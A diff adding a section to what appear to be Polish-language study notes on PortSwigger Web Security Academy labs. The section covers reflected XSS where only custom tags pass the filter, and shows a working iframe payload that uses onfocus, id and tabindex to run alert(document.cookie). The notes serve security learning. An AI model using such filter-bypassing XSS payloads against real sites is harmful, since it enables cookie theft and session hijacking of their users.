@@ -237,6 +237,17 @@ i mamy:
 {"searchTerm":"\\"-alert(1)}//", "results":[]}
 ```
 
+## Lab: Reflected XSS into HTML context with all tags blocked except custom ones
+1. Właściwość `onfocus` aktywowana jest w momencie gdy zostanie wysłane zapyatbnie na url: `domena.com#<id_elementu>`
+2. Działa ona dla części elementów ale nie wszystkich, dodają jednak atrybut `tabindex=1` (wartość dowolna), działa dla właściwie wszystkich elementów, nawet customowych: 
+```js
+<iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert(document.cookie)+id%3Dx+tabindex%3D1%3E#x></iframe>
+
+// <iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=<xss onfocus=alert(document.cookie) id=x tabindex=1>#x></iframe>
+```
+Źródło: https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
+
+
 # CSRF
 
 ## Lab: CSRF vulnerability with no defenses
